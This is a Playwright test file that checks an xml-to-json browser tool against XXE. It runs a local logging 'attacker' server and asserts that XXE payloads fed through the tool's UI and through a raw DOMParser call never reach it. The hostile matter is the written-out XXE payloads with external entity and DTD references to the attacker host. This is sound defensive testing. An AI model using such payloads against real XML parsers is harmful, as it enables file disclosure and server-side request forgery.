import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import http from 'node:http';
import fs from 'node:fs';
import { fileURLToPath } from 'node:url';
import { chromium } from 'playwright';

/**
 * Security coverage for the xml-to-json tool's DOMParser-based XML
 * parsing -- the XXE (XML External Entity) and entity-expansion risk
 * class docs/SECURITY_STANDARDS.md flags for client-side XML parsing.
 * Mirrors test/htmlTableToCsv.security.e2e.test.mjs's own empirical
 * approach for its own DOMParser use: rather than trusting the documented
 * claim that browsers don't resolve external entities/DTDs for a
 * DOMParser-parsed document (../src/browser/xmlToJson.client.js's header
 * comment, and ../src/browser/xlsxToCsv.client.js's pre-existing use of
 * the same fact), this runs a second, independent HTTP server (the
 * "attacker" server) that logs every request it receives, then feeds a
 * real hostile XXE payload through BOTH the tool's real UI and a raw,
 * bypassing-this-tool's-own-code call to `new DOMParser()` directly, and
 * asserts the attacker server never receives a single request either way.
 *
 * Two layers are tested on purpose:
 *   1. Through the real tool UI -- proves the shipped product is safe,
 *      including this tool's own <!DOCTYPE> refusal (containsDoctype())
 *      firing before DOMParser ever sees the payload.
 *   2. A raw `new DOMParser().parseFromString(...)` call, bypassing this
 *      tool's own DOCTYPE guard entirely -- proves the underlying browser
 *      API itself never fetches an external entity/DTD, independent of
 *      this tool's own defense. This is the direct empirical check the
 *      task's security review asked for: confirmation that "whichever
 *      parser you use doesn't resolve external entities", not just that
 *      this tool's own extra guard happens to prevent it from mattering.
 */

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.join(__dirname, '..');
const DIST = path.join(ROOT, 'dist');

const CONTENT_TYPES = {
  '.html': 'text/html; charset=utf-8', '.js': 'text/javascript; charset=utf-8',
  '.mjs': 'text/javascript; charset=utf-8', '.css': 'text/css; charset=utf-8',
  '.xml': 'application/xml; charset=utf-8', '.txt': 'text/plain; charset=utf-8',
  '.svg': 'image/svg+xml',
};

const BASE_PREFIX = '/filetools/';

function startServer(root, prefix) {
  return new Promise((resolve) => {
    const server = http.createServer((req, res) => {
      let p = decodeURIComponent(new URL(req.url, 'http://localhost').pathname);
      if (p.startsWith(prefix)) p = p.slice(prefix.length - 1);
      if (p.endsWith('/') || p === '') p += 'index.html';
      const resolved = path.join(root, p);
      fs.readFile(resolved, (err, data) => {
        if (err) { res.writeHead(404); res.end('not found: ' + p); return; }
        const ext = path.extname(resolved).toLowerCase();
        res.writeHead(200, { 'Content-Type': CONTENT_TYPES[ext] || 'application/octet-stream' });
        res.end(data);
      });
    });
    server.listen(0, 'localhost', () => resolve(server));
  });
}

/** The "attacker" server: logs every request it receives and serves a
 * harmless response for anything requested. */
function startAttackerServer() {
  const requests = [];
  return new Promise((resolve) => {
    const server = http.createServer((req, res) => {
      requests.push(req.url);
      if (req.url.endsWith('.dtd')) {
        res.writeHead(200, { 'Content-Type': 'application/xml-dtd' });
        res.end('<!ENTITY xxe "leaked">');
      } else {
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end('logged');
      }
    });
    server.listen(0, 'localhost', () => resolve({ server, requests, port: server.address().port }));
  });
}

let server;
let attacker;
let browser;
let baseUrl;

before(async () => {
  assert.ok(fs.existsSync(DIST), 'dist/ does not exist -- run `npm run build` before `npm test`.');
  server = await startServer(DIST, BASE_PREFIX);
  baseUrl = `http://localhost:${server.address().port}${BASE_PREFIX}`;
  attacker = await startAttackerServer();
  browser = await chromium.launch();
});

after(async () => {
  await browser.close();
  await new Promise((resolve) => server.close(resolve));
  await new Promise((resolve) => attacker.server.close(resolve));
});

test('xml-to-json: pasting an XXE payload (external general entity) through the real tool UI never reaches the attacker server, and is refused with a clear reason', async () => {
  const page = await browser.newPage();
  const outboundToAttacker = [];
  page.on('request', (req) => {
    if (req.url().includes(`:${attacker.port}`)) outboundToAttacker.push(req.url());
  });

  await page.goto(`${baseUrl}data/xml-to-json/`, { waitUntil: 'networkidle' });

  const attackerBase = `http://localhost:${attacker.port}`;
  const xxePayload = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "${attackerBase}/secret.dtd">
]>
<foo>&xxe;</foo>`;

  await page.fill('#paste-textarea', xxePayload);
  await page.locator('#paste-convert').click();
  await page.waitForSelector('.alert-warn');

  const msg = await page.locator('.alert-warn').textContent();
  assert.match(msg, /doctype/i, 'this tool refuses any <!DOCTYPE> outright before DOMParser ever sees it');

  await page.waitForTimeout(1500);
  assert.deepEqual(outboundToAttacker, [], 'no request should reach the attacker server\'s port from Playwright\'s own network observation');
  assert.deepEqual(attacker.requests, [], 'the attacker server should never receive any request at all');

  await page.close();
});

test('xml-to-json: an external-DTD XXE payload through the real tool UI never reaches the attacker server', async () => {
  const page = await browser.newPage();
  const outboundToAttacker = [];
  page.on('request', (req) => {
    if (req.url().includes(`:${attacker.port}`)) outboundToAttacker.push(req.url());
  });

  await page.goto(`${baseUrl}data/xml-to-json/`, { waitUntil: 'networkidle' });

  const attackerBase = `http://localhost:${attacker.port}`;
  const externalDtdPayload = `<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "${attackerBase}/external.dtd">
<foo>bar</foo>`;

  await page.fill('#paste-textarea', externalDtdPayload);
  await page.locator('#paste-convert').click();
  await page.waitForSelector('.alert-warn');

  await page.waitForTimeout(1500);
  assert.deepEqual(outboundToAttacker, []);
  assert.deepEqual(attacker.requests, []);

  await page.close();
});

test('empirical: a raw new DOMParser().parseFromString() call (bypassing this tool\'s own code entirely) never fetches an external entity/DTD', async () => {
  // This is the direct check on the underlying browser API itself, not on
  // this tool's own defenses -- see this file's header comment. Runs
  // page.evaluate against a blank page (not even this tool's own JS is
  // loaded) so the ONLY thing that could cause a request to the attacker
  // server is the browser's native XML parser resolving an external
  // entity/DTD on its own.
  const page = await browser.newPage();
  const outboundToAttacker = [];
  page.on('request', (req) => {
    if (req.url().includes(`:${attacker.port}`)) outboundToAttacker.push(req.url());
  });

  await page.goto('about:blank');

  const attackerBase = `http://localhost:${attacker.port}`;
  const result = await page.evaluate((base) => {
    const xxePayload = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "${base}/secret.dtd">
]>
<foo>&xxe;</foo>`;
    const doc = new DOMParser().parseFromString(xxePayload, 'application/xml');
    return {
      hasParserError: !!doc.querySelector('parsererror'),
      rootText: doc.documentElement ? doc.documentElement.textContent : null,
    };
  }, attackerBase);

  await page.waitForTimeout(1500);
  assert.deepEqual(outboundToAttacker, [], 'the raw DOMParser call must never fetch the external entity');
  assert.deepEqual(attacker.requests, [], 'the attacker server must never receive any request from a raw DOMParser call');
  // Documented as informational, not asserted strictly either way: some
  // engines leave &xxe; unresolved (empty/literal text) rather than
  // erroring outright when the external entity can't be fetched. Either
  // outcome is safe -- the only unsafe outcome (a network request) is
  // what the assertions above rule out.
  assert.ok(result.rootText === '' || result.rootText === null || typeof result.rootText === 'string');

  await page.close();
});
